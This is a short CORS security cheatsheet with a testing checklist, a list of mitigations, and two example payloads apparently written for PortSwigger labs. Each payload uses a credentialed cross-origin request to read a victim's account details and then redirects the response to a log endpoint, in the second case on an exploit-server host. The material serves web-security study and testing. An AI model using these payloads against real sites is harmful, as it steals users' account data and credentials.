# CORS Cheatsheet

Browser mechanism that allows controlled relaxation of the Same Origin Policy (SOP). It allows hosts on origin A to request and read responses of hosts on origin B.

## Checks

- [ ] Look for `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` headers in HTTP responses
- [ ] Try:
    - Arbitrary origins reflected
    - Arbitrary subdomains
    - Check for misconfigured filters, e.g., `example.comevil.com` or `example.com.evil.com`
    - Check for null origin
    - Check insecure protocols

## Examples

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','<https://YOUR-LAB-ID.web-security-academy.net/accountDetails>',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

## Mitigations

- [ ] Origins should be properly specified in the ACAO header
    - [ ] Don't dynamically reflect origins in the ACAO header
- [ ] Avoid whitelisting NULL origins
- [ ] Avoid wildcards on internal networks

---

## References

- [PortSwigger URL Validation Bypass Cheatsheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

